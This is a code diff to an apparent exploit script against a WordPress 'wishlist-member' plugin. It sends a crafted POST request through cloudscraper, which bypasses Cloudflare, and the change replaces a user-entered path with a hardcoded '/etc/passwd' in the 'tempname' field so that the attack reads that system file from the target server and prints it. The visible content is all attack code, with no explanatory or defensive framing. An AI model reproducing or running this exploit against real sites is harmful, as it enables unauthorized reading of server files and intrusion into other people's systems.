@@ -36,7 +36,7 @@ def exploit(url):
 
 def capture(id,url):
         urlv = f"{url}/wishlist-member"
-        path = input("Enter Path: ")
+        #path = input("Enter Path: ")
         scraper = cloudscraper.create_scraper()
         headers = {
             "Content-Type": "application/x-www-form-urlencoded",
@@ -52,7 +52,7 @@ def capture(id,url):
            "include_inactive": "1",
            "per_page": "10",
            "current_page": "99999999999999999",
-           "tempname": f"{path}",
+           "tempname": f"/etc/passwd",
         }
         response = scraper.post(url, headers=headers, data=data, allow_redirects=True)
         print(f"Capture: {response.text}")
